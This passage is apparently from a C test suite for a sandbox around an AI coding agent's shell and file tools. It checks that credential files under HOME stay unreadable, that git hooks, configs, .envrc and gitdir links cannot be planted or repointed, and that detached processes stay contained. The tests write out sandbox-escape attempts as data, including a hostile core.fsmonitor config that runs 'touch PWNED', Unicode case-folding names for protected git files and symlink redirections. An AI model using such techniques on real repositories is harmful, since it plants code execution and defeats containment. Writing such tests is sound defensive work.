    for (int i = 0; i < 7; i++) {
        put(under(home, creds[i]), "TOPSECRET");
        put(under(home, beside[i]), "TOOLOK");
    }
    in_dir(later);
    for (int i = 0; i < 7; i++) {
        char cmd[256];
        snprintf(cmd, sizeof cmd, "cat \"$HOME/%s\"", creds[i]);
        hidden(cmd);
        snprintf(cmd, sizeof cmd, "cat \"$HOME/%s\"", beside[i]);
        shown(cmd, "TOOLOK");
    }
    hidden("cat \"$HOME/.NVM/versions/node/v1/etc/NPMRC\"");

    setenv("HOME", old, 1);
    free(old);
}

/* a link on PATH under a home is given to commands as where it leads: the link
   itself cannot be read, and a PATH search by Node stops there */
static void test_home_path(void) {
    char base[PATH_MAX], home[PATH_MAX], unused[PATH_MAX], real[PATH_MAX], proj[PATH_MAX + 16];
    char *old = review_dirs(base, home, unused);
    if (!old) { T("mkdtemp", false); return; }
    const char *had = getenv("PATH");
    char *path = str_dup(had ? had : "/usr/bin:/bin");
    snprintf(proj, sizeof proj, "%s/work/proj", home);
    put(under(home, "work/proj/f"), "x");
    put(under(home, ".closed/bin/secret"), "TOPSECRET");
    put(under(home, "co:lon/f"), "x");
    host(home, "mkdir .slot plaindir && ln -s ../.closed/bin .slot/bin && ln -s co:lon colon"
               " && ln -s nowhere dangling");
    T("home resolves", realpath(home, real) != NULL);

    /* entries kept as they are: not under a home, relative, empty, unresolvable,
       or leading to a name PATH cannot hold */
    char set[8 * PATH_MAX], want[8 * PATH_MAX];
    snprintf(set, sizeof set, "%s/.slot/bin::rel:%s/plaindir:%s/colon:%s/dangling:/tmp:/usr/bin:/bin:",
             real, real, real, real);
    snprintf(want, sizeof want, "[%s/.closed/bin::rel:%s/plaindir:%s/colon:%s/dangling:/tmp:/usr/bin:/bin:]",
             real, real, real, real);
    setenv("PATH", set, 1);
    in_dir(proj);
    shown("printf '[%s]' \"$PATH\"", want);
    setenv("PATH", path, 1);

    if (!system("node -e 0 >/dev/null 2>&1")) {
        snprintf(set, sizeof set, "%s/.slot/bin:%s", real, path);
        setenv("PATH", set, 1);
        shown("node -e 'const r = require(\"child_process\").spawnSync(\"sh\", [\"-c\", \"echo SPAWNED\"]);"
              " console.log(String(r.stdout || r.error))'", "SPAWNED");
    } else printf("unit: SKIP node PATH search under the sandbox (not installed)\n");
    hidden("cat \"$HOME/.slot/bin/secret\"");
    hidden("cat \"$HOME/.closed/bin/secret\"");

    setenv("PATH", path, 1);
    free(path);
    setenv("HOME", old, 1);
    free(old);
}

/* git in a submodule reads its git directory and no more */
static void test_repo_above(void) {
    char base[PATH_MAX], home[PATH_MAX], unused[PATH_MAX];
    char repo[PATH_MAX + 16], sub[PATH_MAX + 32], mod[PATH_MAX + 32], dir[PATH_MAX + 32];
    char *old = review_dirs(base, home, unused);
    if (!old) { T("mkdtemp", false); return; }
    snprintf(repo, sizeof repo, "%s/work/repo", home);
    snprintf(sub, sizeof sub, "%s/sub", repo);
    snprintf(mod, sizeof mod, "%s/mod", repo);
    put(under(home, ".gitconfig"), "[user]\n\tname = t\n\temail = t@t\n");
    put(under(home, "work/repo/sub/f"), "x\n");
    put(under(home, "work/repo/other/o"), "TOPSECRET\n");
    put(under(home, "work/lib/l"), "l\n");
    put(under(home, "plain"), "TOPSECRET\n");
    host(repo, "git -C ../lib init -q && git -C ../lib add l && git -C ../lib commit -qm l"
               " && git init -q . && git add sub other && git commit -qm one"
               " && git -c protocol.file.allow=always submodule --quiet add ../lib mod"
               " && git commit -qm two");

    /* a subdirectory gets nothing of the repository around it */
    in_dir(sub);
    closed_git("git log --oneline");
    shown("cat ../.git/HEAD", "Operation not permitted");
    shown("ls ..", "Operation not permitted");

    in_dir(mod);
    put(under(mod, "new"), "x");
    shown("git status --porcelain", "?? new");
    hidden("cat ../other/o ../../../plain");
    shown("cat ../.git/HEAD", "Operation not permitted");
    quiet("echo evil > ../.git/modules/mod/planted");
    T("submodule git directory not written", gone(repo, ".git/modules/mod/planted"));

    /* a gitdir the module does not point back from, or outside .git/modules */
    put(under(repo, "forged/.git"), "gitdir: ../.git/modules/mod\n");
    snprintf(dir, sizeof dir, "%s/forged", repo);
    in_dir(dir);
    shown("cat ../.git/modules/mod/HEAD", "Operation not permitted");
    put(under(home, "work/repo/apart/a"), "x");
    snprintf(dir, sizeof dir, "%s/apart", repo);
    host(dir, "git init -q --separate-git-dir ../../sep .");
    in_dir(dir);
    closed_git("git status");

    /* a .git link above is not followed */
    put(under(home, "work/linked/in/.git"), "gitdir: ../.git/modules/mod\n");
    snprintf(dir, sizeof dir, "%s/work/linked/in", home);
    host(dir, "ln -s ../repo/.git ../.git");
    in_dir(dir);
    shown("cat \"$HOME/work/repo/.git/HEAD\"", "Operation not permitted");

    /* a repository at home, or around it, stays closed */
    put(under(home, "work/plain/.git"), "gitdir: ../../.git/modules/m\n");
    snprintf(dir, sizeof dir, "%s/work/plain", home);
    host(home, "git init -q . && git add plain && git commit -qm dots"
               " && git init -q --bare .git/modules/m"
               " && git --git-dir=.git/modules/m config core.bare false"
               " && git --git-dir=.git/modules/m config core.worktree ../../../work/plain");
    in_dir(dir);
    closed_git("git log");
    shown("cat \"$HOME/.git/modules/m/HEAD\"", "Operation not permitted");
    shown("cat \"$HOME/.git/HEAD\"", "Operation not permitted");

    setenv("HOME", old, 1);
    free(old);
}

/* a project whose own names make a directory look like a repository */
static void user_files(const char *proj, const char *sub) {
    char script[600];
    snprintf(script, sizeof script, "mkdir -p %srefs %sconfig %shooks && echo a: 1 > %sconfig/app.yml"
             " && echo hook > %shooks/useX.js", sub, sub, sub, sub, sub);
    host(proj, script);
}

static bool user_files_there(const char *proj, const char *sub) {
    char a[256], b[256];
    snprintf(a, sizeof a, "%sconfig/app.yml", sub);
    snprintf(b, sizeof b, "%shooks/useX.js", sub);
    return !gone(proj, a) && !gone(proj, b);
}

/* nothing that existed before a command or a tool call is renamed */
static void test_keeps_user_files(void) {
    char base[PATH_MAX], home[PATH_MAX], proj[PATH_MAX];
    char *old = review_dirs(base, home, proj);
    if (!old) { T("mkdtemp", false); return; }
    static const char *const subs[] = {"", "sub/"};
    for (int u = 0; u < 2; u++)
        for (int i = 0; i < 2; i++) {
            snprintf(proj, sizeof proj, "%s/tool%d%d", base, u, i);
            mkdir(proj, 0700);
            user_files(proj, subs[i]);
            bool was = g_cfg.unsafe;
            g_cfg.unsafe = u;
            char path[64];
            snprintf(path, sizeof path, "%sobjects/a.txt", subs[i]);
            char *r = tool_write_file(proj, path, "x");
            T("tool: write beside user files", !strncmp(r, "ok:", 3) && !strstr(r, "quarantined"));
            free(r);
            g_cfg.unsafe = was;
            T("tool: user files not renamed", user_files_there(proj, subs[i]));
        }
    if (sandbox_available()) {
        for (int i = 0; i < 2; i++) {
            snprintf(proj, sizeof proj, "%s/sh%d", base, i);
            mkdir(proj, 0700);
            user_files(proj, subs[i]);
            char cmd[64];
            snprintf(cmd, sizeof cmd, "mkdir %sobjects", subs[i]);
            char *o = run_bash(cmd, proj, 30);
            T("shell: nothing renamed", !strstr(o, "quarantined") && user_files_there(proj, subs[i]));
            free(o);
        }
        /* nothing is renamed even when a command completes a repository */
        snprintf(proj, sizeof proj, "%s/done", base);
        mkdir(proj, 0700);
        host(proj, "mkdir -p s/objects s/refs && printf '[core]\\n\\tfsmonitor = x\\n' > s/config");
        free(run_bash("echo 'ref: refs/heads/main' > s/HEAD", proj, 30));
        T("shell: nothing moved", !gone(proj, "s/HEAD") && !gone(proj, "s/config"));
    }
    setenv("HOME", old, 1);
    free(old);
}

#define DETACH(then) "perl -MPOSIX -e 'exit if fork; setsid; close STDIN; close STDOUT;" \
                     " close STDERR; sleep 1; " then "'"

/* a process that left the command's group stays bound by the rules; it is
   stopped only when the command had network access */
static void test_detached(void) {
    char base[PATH_MAX], home[PATH_MAX], proj[PATH_MAX];
    char *old = review_dirs(base, home, proj);
    if (!old) { T("mkdtemp", false); return; }
    char *o = run_bash("mkdir n; " DETACH("open F, q(>), q(n/.envrc); print F q(evil); open G, q(>), q(late)")
                       "; (sleep 1; echo up > grouped) >/dev/null 2>&1 &", proj, 30);
    T("background processes are not reported stopped", !strstr(o, "stopped"));
    free(o);
    int code = -1;
    o = run_bash_net(DETACH("open F, q(>), q(online)"), proj, 30, &code);
    T("network command: stopping is reported", !code && strstr(o, "stopped"));
    free(o);
    sleep(2);
    T("detached process wrote nothing protected", gone(proj, "n/.envrc"));
    T("background servers survive", !gone(proj, "late") && !gone(proj, "grouped"));
    T("nothing with network access survives", gone(proj, "online"));
    setenv("HOME", old, 1);
    free(old);
}

/* more nested items than one rule each can hold */
static void test_many_items(void) {
    char base[PATH_MAX], home[PATH_MAX], proj[PATH_MAX];
    char *old = review_dirs(base, home, proj);
    if (!old) { T("mkdtemp", false); return; }
    host(proj, "git init -q . && i=0; while [ $i -lt 1100 ]; do mkdir -p r$i/.git node_modules/p$i;"
               " echo safe > r$i/.git/config; echo safe > node_modules/p$i/.envrc; i=$((i+1)); done;"
               " git init -q n0");
    int code = -1;
    char *o = run_bash_status("echo hi", proj, 60, &code);
    T("many nested items: commands still run", !code && strstr(o, "hi"));
    free(o);
    in_dir(proj);
    quiet("echo evil > r7/.git/config; echo evil > r1099/.GIT/CONFIG; echo evil > node_modules/p9/.envrc;"
          " mkdir r7/.git/hooks; echo evil > r7/.git/hooks/pre-commit; echo evil > r8/.git/commondir;"
          " mv r7/.git g; mv r9 q; echo evil > q/.git/config; mkdir n; echo evil > n/.EnvRC");
    quiet("mkdir 'r8/.git/hook\xc5\xbf'; echo evil > 'r8/.git/con\xef\xac\x81g'");
    T("many: nested configs closed", holds(under(proj, "r7/.git/config"), "safe\n")
      && holds(under(proj, "r1099/.git/config"), "safe\n") && holds(under(proj, "r8/.git/config"), "safe\n")
      && (gone(proj, "q") || holds(under(proj, "q/.git/config"), "safe\n")));
    T("many: nested .envrc closed", holds(under(proj, "node_modules/p9/.envrc"), "safe\n")
      && gone(proj, "n/.envrc"));
    T("many: nothing planted", gone(proj, "r7/.git/hooks") && gone(proj, "r8/.git/commondir")
      && gone(proj, "r8/.git/hooks") && gone(proj, "g"));
    o = run_bash_status("echo a > a && git add a && git -c user.name=t -c user.email=t@t commit -qm a",
                        proj, 60, &code);
    T("many: git in the root works", !code);
    free(o);
    setenv("HOME", old, 1);
    free(old);
}

/* nested git files, .envrc and .git link files: create, replace, rename into
   place, symlink, hard link, renamed parents */
static void test_blocked_writes(void) {
    char base[PATH_MAX], home[PATH_MAX], proj[PATH_MAX];
    char *old = review_dirs(base, home, proj);
    if (!old) { T("mkdtemp", false); return; }
    host(proj, "git init -q . && git -c user.name=t -c user.email=t@t commit -qm one --allow-empty"
               " && git init -q sub && git init -q --bare .git/modules/m && git worktree add -q wt -b wt"
               " && mkdir env link n m s f h q k && echo safe > env/.envrc"
               " && echo 'gitdir: ../.git/modules/m' > link/.git && echo evil > t");
    char *cfg = slurp(under(proj, "sub/.git/config"));
    char *mod = slurp(under(proj, ".git/modules/m/config"));
    char *com = slurp(under(proj, ".git/worktrees/wt/commondir"));
    if (!cfg || !mod || !com) { T("fixture", false); setenv("HOME", old, 1); free(old); return; }
    in_dir(proj);

    /* new .envrc and .git entries of any type */
    quiet("echo evil > n/.envrc; echo evil > n/.ENVRC; mkdir m/.envrc; ln -s ../t s/.envrc;"
          " cp t m/.envrc; mv t q/.envrc; ln t h/.envrc; echo evil > .ENVRC");
    quiet("echo 'gitdir: x' > f/.git; mkdir m/.git; ln -s ../sub/.git s/.git; ln t h/.git;"
          " mv t q/.GIT; mkdir k/.Git");
    quiet("echo evil > $TMPDIR/e; mv $TMPDIR/e q/.envrc; mkdir -p $TMPDIR/p/.git; mv $TMPDIR/p/.git k/.git;"
          " echo evil > $TMPDIR/.envrc; mv $TMPDIR/.envrc q/.envrc");
    T("no .envrc made", gone(proj, "n/.envrc") && gone(proj, "m/.envrc") && gone(proj, "s/.envrc")
      && gone(proj, "q/.envrc") && gone(proj, "h/.envrc") && gone(proj, ".envrc"));
    T("no .git made", gone(proj, "f/.git") && gone(proj, "m/.git") && gone(proj, "s/.git")
      && gone(proj, "h/.git") && gone(proj, "q/.git") && gone(proj, "k/.git"));
    T("rename source kept", !gone(proj, "t"));

    /* what is there cannot be replaced, removed or reached by another name */
    quiet("echo evil > env/.envrc; rm -f env/.envrc; mv env/.envrc e1; mv -f t env/.envrc;"
          " ln -sf ../t env/.envrc; ln env/.envrc a1 && echo evil >> a1");
    quiet("echo evil > link/.git; rm -f link/.git; mv link/.git e2; mv -f t link/.git;"
          " ln -sfn ../t link/.git; ln link/.git a2 && echo evil >> a2");
    quiet("ln sub/.git/config a3 && echo evil >> a3; ln .git/modules/m/config a4 && echo evil >> a4");
    T(".envrc unchanged", holds(under(proj, "env/.envrc"), "safe\n") && gone(proj, "e1")
      && gone(proj, "a1"));
    T(".git link file unchanged", holds(under(proj, "link/.git"), "gitdir: ../.git/modules/m\n")
      && gone(proj, "e2") && gone(proj, "a2"));
    T("no hard link to a nested config", gone(proj, "a3") && gone(proj, "a4"));

    /* every spelling the filesystem folds to a protected name */
    static const char *const spelled[] = {
        "con\xef\xac\x81g", "con\xef\xac\x81g.worktree", "config.wor\xe2\x84\xaatree",
        "con\xef\xac\x81g.wor\xe2\x84\xaatree", "hoo\xe2\x84\xaas", "hook\xc5\xbf",
        "hoo\xe2\x84\xaa\xc5\xbf", "COMMONDIR", "CONFIG"};
    for (int i = 0; i < (int)(sizeof spelled / sizeof *spelled); i++) {
        char cmd[300];
        snprintf(cmd, sizeof cmd, "echo evil >> 'sub/.git/%s'; echo evil > 'sub/.git/%s/pre-commit';"
                 " echo evil >> '.git/module\xc5\xbf/m/%s'", spelled[i], spelled[i], spelled[i]);
        quiet(cmd);
    }
    quiet("echo evil > '.git/wor\xe2\x84\xaatree\xc5\xbf/wt/commondir';"
          " mkdir '.git/wor\xe2\x84\xaatree\xc5\xbf/zz' '.git/module\xc5\xbf/zz'");
    T("folded spellings blocked", holds(under(proj, "sub/.git/config"), cfg)
      && holds(under(proj, ".git/modules/m/config"), mod)
      && holds(under(proj, ".git/worktrees/wt/commondir"), com)
      && gone(proj, "sub/.git/config.worktree") && gone(proj, "sub/.git/commondir")
      && gone(proj, "sub/.git/hooks/pre-commit") && gone(proj, ".git/modules/m/config.worktree")
      && gone(proj, ".git/modules/m/commondir") && gone(proj, ".git/worktrees/zz")
      && gone(proj, ".git/modules/zz"));

    /* a prepared directory cannot be moved or linked to where git looks */
    quiet("mkdir -p w/hooks && echo evil > w/config; mv w .git/modules/w; mv w .git/worktrees/w;"
          " ln -s ../../w .git/modules/l; mv w k/.git; mkdir -p $TMPDIR/g/modules; mv $TMPDIR/g k/.git");
    T("prepared directory not moved in", !gone(proj, "w/config") && gone(proj, ".git/modules/w")
      && gone(proj, ".git/worktrees/w") && gone(proj, ".git/modules/l") && gone(proj, "k/.git"));

    /* a renamed parent takes the protection along */
    quiet("mv .git/modules mods; mv .git/worktrees wts; mv .git/modules/m .git/m2; mv .git g;"
          " mv sub/.git sub/g");
    T("git directories not renamed", gone(proj, "mods") && gone(proj, "wts") && gone(proj, ".git/m2")
      && gone(proj, "g") && gone(proj, "sub/g"));
    quiet("mv sub sub2; mv env env2; echo evil >> sub2/.git/config; echo evil > sub2/.git/hooks/pre-commit;"
          " rm -f sub2/.git/config; echo evil > env2/.envrc; mv env2 env; mv sub2 sub");
    T("protected after renaming the parent", holds(under(proj, "sub/.git/config"), cfg)
      && gone(proj, "sub/.git/hooks/pre-commit") && holds(under(proj, "env/.envrc"), "safe\n"));
    free(cfg);
    free(mod);
    free(com);

    /* the repository of the project itself still works */
    int code = -1;
    char *o = run_bash_status("echo a > a && git add a && git -c user.name=t -c user.email=t@t commit -qm a"
                              " && git branch new && git switch -q new && git switch -q -", proj, 30, &code);
    T("git add, commit and branch work", !code);
    free(o);

    /* rules do not depend on being able to read the tree or write the root */
    snprintf(proj, sizeof proj, "%s/locked", base);
    mkdir(proj, 0700);
    host(proj, "mkdir shut sub && chmod 000 shut");
    free(run_bash("chmod 555 .", proj, 30));
    free(run_bash("mkdir sub/.git; echo evil > sub/.envrc; chmod 700 shut; mkdir shut/.git", proj, 30));
    T("unreadable tree, read-only root: still blocked", gone(proj, "sub/.git")
      && gone(proj, "sub/.envrc") && gone(proj, "shut/.git"));
    chmod(proj, 0755);
    chmod(under(proj, "shut"), 0700);

    /* a root that is already a bare repository */
    snprintf(proj, sizeof proj, "%s/bare", base);
    mkdir(proj, 0700);
    host(proj, "git init -q --bare .");
    char *rootcfg = slurp(under(proj, "config"));
    free(run_bash("echo evil >> config; echo evil > hooks/pre-commit; echo /tmp > commondir", proj, 30));
    T("bare root: config and hooks closed", rootcfg && holds(under(proj, "config"), rootcfg)
      && gone(proj, "hooks/pre-commit") && gone(proj, "commondir"));
    free(rootcfg);
    setenv("HOME", old, 1);
    free(old);
}

/* nothing a hostile config would run has run when git is used outside */
static bool git_runs_nothing(const char *proj) {
    char cmd[PATH_MAX + 80];
    snprintf(cmd, sizeof cmd, "cd '%s' && git status >/dev/null 2>&1", proj);
    if (system(cmd) < 0) return false;
    return gone(proj, "PWNED");
}

#define HOSTILE "[core]\n repositoryformatversion=0\n bare=false\n worktree=.\n fsmonitor=\"touch PWNED; false\"\n"
#define HOSTILE_SH "printf '[core]\\n repositoryformatversion=0\\n bare=false\\n worktree=.\\n fsmonitor=\"touch PWNED; false\"\\n' > config"

/* the root cannot be made a bare repository, whatever state .git is in */
static void test_root_bare(void) {
    char base[PATH_MAX], home[PATH_MAX], proj[PATH_MAX];
    char *old = review_dirs(base, home, proj);
    if (!old) { T("mkdtemp", false); return; }
    static const char *const repo = "git init -q . && git -c user.name=t -c user.email=t@t"
                                    " commit -qm one --allow-empty";

    /* shell: .git made invalid, then the root dressed up */
    host(proj, repo);
    in_dir(proj);
    quiet("mv .git/HEAD .git/HEAD.x; mkdir -p objects refs/heads; " HOSTILE_SH);
    quiet("echo 'ref: refs/heads/main' > HEAD; echo 'ref: refs/heads/main' > hEaD;"
          " echo 'ref: refs/heads/main' > h; mv h Head; ln h head; ln -s refs/heads/main HEAD;"
          " mkdir HEAD; mv $TMPDIR/none HEAD");
    T("shell: no root HEAD with .git present", gone(proj, "HEAD"));
    T("shell: git runs nothing", git_runs_nothing(proj));

    /* file tools only */
    snprintf(proj, sizeof proj, "%s/tools", base);
    mkdir(proj, 0700);
    host(proj, repo);
    free(tool_write_file(proj, "config", HOSTILE));
    refused("tool: root HEAD with .git", tool_write_file(proj, "HEAD", "ref: refs/heads/main\n"));
    refused("tool: root head, other case", tool_write_file(proj, "hEaD", "ref: refs/heads/main\n"));
    refused("tool: nothing below a new root HEAD", tool_write_file(proj, "Head/x", "x"));
    free(tool_write_file(proj, "objects/k", "k"));
    free(tool_write_file(proj, "refs/heads/k", "k"));
    free(tool_write_file(proj, ".git/HEAD", "junk"));
    T("tool: no root HEAD", gone(proj, "HEAD"));
    T("tool: git runs nothing", git_runs_nothing(proj));

    /* .git is a link */
    snprintf(proj, sizeof proj, "%s/linked", base);
    mkdir(proj, 0700);
    host(proj, repo);
    host(proj, "mv .git .realgit && ln -s .realgit .git");
    in_dir(proj);
    quiet("mv .realgit/HEAD .realgit/H; rm .git; mv .git g; mkdir -p objects refs/heads; " HOSTILE_SH);
    quiet("echo 'ref: refs/heads/main' > HEAD");
    refused("symlinked .git, tool: root HEAD", tool_write_file(proj, "HEAD", "ref: refs/heads/main\n"));
    struct stat st;
    T("symlinked .git: link kept, no root HEAD", !lstat(under(proj, ".git"), &st)
      && S_ISLNK(st.st_mode) && gone(proj, "HEAD") && gone(proj, "g"));
    T("symlinked .git: git runs nothing", git_runs_nothing(proj));

    /* no .git at all */
    snprintf(proj, sizeof proj, "%s/plain", base);
    mkdir(proj, 0700);
    in_dir(proj);
    quiet("mkdir -p objects refs/heads; " HOSTILE_SH);
    quiet("echo 'ref: refs/heads/main' > HeAd");
    free(tool_write_file(proj, "HEAD", "ref: refs/heads/main\n"));
    T("no .git: no root HEAD", gone(proj, "HEAD") && git_runs_nothing(proj));

    /* a HEAD that is there already: the rest of a bare repository stays shut */
    snprintf(proj, sizeof proj, "%s/hashead", base);
    mkdir(proj, 0700);
    host(proj, repo);
    host(proj, "echo 'ref: refs/heads/main' > HEAD");
    in_dir(proj);
    quiet("mv .git/HEAD .git/H; mkdir -p objects refs/heads; " HOSTILE_SH "; echo x > HEAD; rm HEAD");
    refused("existing HEAD, tool: config", tool_write_file(proj, "config", HOSTILE));
    T("existing HEAD: unchanged, no config", holds(under(proj, "HEAD"), "ref: refs/heads/main\n")
      && gone(proj, "config"));

    /* a directory of that name holds ordinary files, and the repository works */
    snprintf(proj, sizeof proj, "%s/headdir", base);
    mkdir(proj, 0700);
    host(proj, repo);
    host(proj, "mkdir head hooks");
    in_dir(proj);
    int code = -1;
    char *o = run_bash_status("echo a > head/a && echo b > hooks/b && git add head hooks &&"
        " git -c user.name=t -c user.email=t@t commit -qm two && git branch n && git switch -q n",
        proj, 30, &code);
    T("head/ directory writable, git add, commit, branch work", !code);
    free(o);
    free(tool_write_file(proj, "head/c", "c"));
    T("tool: file in an existing head/", holds(under(proj, "head/c"), "c"));

    /* a protected link that cannot be followed: nothing runs */
    static const char *const loops[] = {".envrc", ".git/hooks", ".git/config.worktree"};
    for (int i = 0; i < 3; i++) {
        char dir[PATH_MAX], target[PATH_MAX];
        snprintf(dir, sizeof dir, "%s/loop%d", base, i);
        mkdir(dir, 0700);
        host(dir, repo);
        snprintf(target, sizeof target, "%s", under(dir, loops[i]));
        if (i == 1) host(dir, "rm -rf .git/hooks");
        T("loop link made", !symlink(target, target));
        o = run_bash("echo ran > ran", dir, 30);
        T(loops[i], !strncmp(o, "error:", 6) && gone(dir, "ran"));
        free(o);
    }
    snprintf(proj, sizeof proj, "%s/plain", base);
    T("loop in a store", !symlink(".npmrc", under(home, ".npmrc")));
    o = run_bash("echo ran > ran", proj, 30);
    T("unresolvable store: command refused", !strncmp(o, "error:", 6) && gone(proj, "ran"));
    free(o);
    sandbox_disable_for_test(false);
    T("unresolvable store: sandbox still counts as available", sandbox_available());
    unlink(under(home, ".npmrc"));
    setenv("HOME", old, 1);
    free(old);
}

/* each way git can be led to its files: nothing on the way can be repointed
   at a repository the command built */
static void test_git_chains(void) {
    char base[PATH_MAX], home[PATH_MAX], proj[PATH_MAX];
    char *old = review_dirs(base, home, proj);
    if (!old) { T("mkdtemp", false); return; }
    static const char *const repo = "git init -q . && git config user.name t && git config user.email t@t"
                                    " && git commit -qm one --allow-empty";
    /* setup outside, then the command's attempt to repoint */
    static const struct { const char *name, *setup, *attempt, *file, *text; } chain[] = {
        {"link-gitfile", "mv .git real && echo 'gitdir: real' > gf && ln -s gf .git",
         "echo 'gitdir: evil' > gf", "gf", "gitdir: evil\n"},
        {"gitfile-link", "mv .git real && ln -s real L && echo 'gitdir: L' > .git",
         "rm L && ln -s evil L; mv -h $PWD/n L", "L/x", NULL},
        {"link-link", "mv .git real && ln -s real L && ln -s L .git",
         "rm L && ln -s evil L", "L/x", NULL},
        {"hooks-link", "mkdir -p real/hooks && ln -s real s && rm -rf .git/hooks && ln -s ../s/hooks .git/hooks",
         "rm s && ln -s evil s", "s/x", NULL},
        {"dotdot", "mkdir d && mv .git real && echo 'gitdir: d/../real' > .git",
         "mv d d2; rmdir d; ln -s evil/sub d", "d", NULL},
        {"gitdir-hooks-link", "mv .git real && echo 'gitdir: real' > .git && mkdir sh && rm -rf real/hooks"
         " && ln -s ../sh real/hooks", "echo evil > sh/pre-commit", "sh/pre-commit", "evil\n"},
        {"commondir", "mkdir c && mv .git real"
         " && mkdir g && cp real/HEAD g/ && echo ../c/l2 > g/commondir && ln -s ../real c/l2"
         " && echo 'gitdir: g' > .git", "rm c/l2 && ln -s ../evil c/l2", "c/l2/x", NULL},
    };
    for (int i = 0; i < (int)(sizeof chain / sizeof *chain); i++) {
        char dir[PATH_MAX], cmd[600];
        snprintf(dir, sizeof dir, "%s/%s", base, chain[i].name);
        mkdir(dir, 0700);
        host(dir, repo);
        host(dir, chain[i].setup);
        in_dir(dir);
        snprintf(cmd, sizeof cmd, "mkdir -p evil/sub evil/hooks evil/real n; %s", chain[i].attempt);
        char *o = run_bash(cmd, dir, 30);
        T(chain[i].name, strncmp(o, "error:", 6));   /* it did run */
        free(o);
        struct stat st;
        if (!strcmp(chain[i].name, "link-gitfile"))
            T(chain[i].name, !holds(under(dir, chain[i].file), chain[i].text));
        else if (!strcmp(chain[i].name, "gitdir-hooks-link"))
            T(chain[i].name, gone(dir, chain[i].file));
        else if (!strcmp(chain[i].name, "dotdot"))
            T(chain[i].name, !lstat(under(dir, "d"), &st) && S_ISDIR(st.st_mode) && gone(dir, "d2"));
        else {
            char *at = str_dup(under(dir, chain[i].file));
            *strrchr(at, '/') = 0;
            char to[PATH_MAX];
            ssize_t n = readlink(at, to, sizeof to - 1);
            to[n > 0 ? n : 0] = 0;
            T(chain[i].name, n > 0 && !strstr(to, "evil") && !strstr(to, "/n"));
            free(at);
        }
        int code = -1;
        o = run_bash_status("echo a > a && git add a && git commit -qm a && git branch new", dir, 30, &code);
        T("chain: git add, commit and branch work", !code);
        free(o);
    }

    /* the file tools keep the gitfile on the way as it is */
    snprintf(proj, sizeof proj, "%s/link-gitfile", base);
    refused("tool: gitfile behind a link", tool_write_file(proj, "gf", "gitdir: evil\n"));
    refused("tool: gitfile through the link", tool_write_file(proj, ".git", "gitdir: evil\n"));
    free(tool_write_file(proj, "other", "x"));
    T("tool: other files still written", holds(under(proj, "other"), "x"));
    setenv("HOME", old, 1);
    free(old);
}

/* what cannot be searched or read cannot be ruled out: nothing runs */
static void test_unreadable_git(void) {
    char base[PATH_MAX], home[PATH_MAX], proj[PATH_MAX];
    char *old = review_dirs(base, home, proj);
    if (!old) { T("mkdtemp", false); return; }
    static const char *const repo = "git init -q . && git config user.name t && git config user.email t@t"
                                    " && git commit -qm one --allow-empty";
    static const struct { const char *name, *setup, *shut, *open, *file; } how[] = {
        {"chmod .git", "mkdir gh && rm -rf .git/hooks && ln -s ../gh .git/hooks",
         "chmod 000 .git", "chmod 755 .git", "gh/pre-commit"},
        {"acl .git", "mv .git/config cfg && ln -s ../cfg .git/config",
         "chmod +a 'everyone deny search' .git", "chmod -N .git", "cfg"},
        {"unreadable gitfile", "mv .git real && echo 'gitdir: real' > .git && mkdir gh && rm -rf real/hooks"
         " && ln -s ../gh real/hooks", "chmod 000 .git", "chmod 644 .git", "gh/pre-commit"},
    };
    for (int i = 0; i < (int)(sizeof how / sizeof *how); i++) {
        char dir[PATH_MAX], cmd[300];
        snprintf(dir, sizeof dir, "%s/shut%d", base, i);
        mkdir(dir, 0700);
        host(dir, repo);
        host(dir, how[i].setup);
        host(dir, how[i].shut);
        snprintf(cmd, sizeof cmd, "%s; echo evil >> %s; echo ran > ran", how[i].open, how[i].file);
        char *o = run_bash(cmd, dir, 30);
        T(how[i].name, !strncmp(o, "error:", 6) && strstr(o, dir) && gone(dir, "ran"));
        free(o);
        o = tool_write_file(dir, "ran", "x");
        T(how[i].name, !strncmp(o, "error:", 6) && gone(dir, "ran"));
        free(o);
        host(dir, how[i].open);
    }
    setenv("HOME", old, 1);
    free(old);
}

static bool mentions(const char *path, const char *want) {
    char *c = slurp(path);
    bool found = c && strstr(c, want);
    free(c);
    return found;
}

/* a hook that is a link runs what it leads to: that is closed too */
static void test_hook_links(void) {
    char base[PATH_MAX], home[PATH_MAX], proj[PATH_MAX];
    char *old = review_dirs(base, home, proj);
    if (!old) { T("mkdtemp", false); return; }
    static const char *const repo = "git init -q . && git config user.name t && git config user.email t@t"
                                    " && git commit -qm one --allow-empty && mkdir scripts"
                                    " && printf '#!/bin/sh\\n:\\n' > scripts/pc && chmod +x scripts/pc";
    static const struct { const char *name, *setup, *cwd; } how[] = {
        {"hook link: project", "ln -s ../../scripts/pc .git/hooks/pre-commit", "."},
        {"hook link: relocated", "mv .git real && echo 'gitdir: real' > .git"
         " && ln -s ../../scripts/pc real/hooks/pre-commit", "."},
        {"hook link: common", "mv .git real && mkdir g && cp real/HEAD g/ && echo ../real > g/commondir"
         " && echo 'gitdir: g' > .git && ln -s ../../scripts/pc real/hooks/pre-commit", "."},
        {"hook link: linked", "git worktree add -q wt && mkdir wt/scripts && cp scripts/pc wt/scripts/"
         " && ln -s ../../wt/scripts/pc .git/hooks/pre-commit", "wt"},
        {"hook link: bare root", "mkdir hooks && ln -s ../scripts/pc hooks/pre-commit && echo x > HEAD", "."},
    };
    for (int i = 0; i < (int)(sizeof how / sizeof *how); i++) {
        char dir[PATH_MAX], at[PATH_MAX];
        snprintf(dir, sizeof dir, "%s/hook%d", base, i);
        mkdir(dir, 0700);
        host(dir, repo);
        host(dir, how[i].setup);
        snprintf(at, sizeof at, "%s", under(dir, how[i].cwd));
        in_dir(at);
        char *o = run_bash("echo 'touch PWNED' >> scripts/pc; echo ran > ran", at, 30);
        T(how[i].name, !gone(at, "ran") && !mentions(under(at, "scripts/pc"), "PWNED"));
        free(o);
        refused(how[i].name, tool_write_file(at, "scripts/pc", "touch PWNED\n"));
        T(how[i].name, !mentions(under(at, "scripts/pc"), "PWNED"));
        free(tool_write_file(at, "scripts/other", "x"));
        T(how[i].name, holds(under(at, "scripts/other"), "x"));
        if (strcmp(how[i].name, "hook link: bare root")) {
            int code = -1;
            o = run_bash_status("echo a > a && git add a && git commit -qm a", at, 30, &code);
            T(how[i].name, !code);
            free(o);
        }
    }

    /* a hooks directory that cannot be listed: its links cannot be closed */
    char dir[PATH_MAX];
    snprintf(dir, sizeof dir, "%s/unlisted", base);
    mkdir(dir, 0700);
    host(dir, repo);
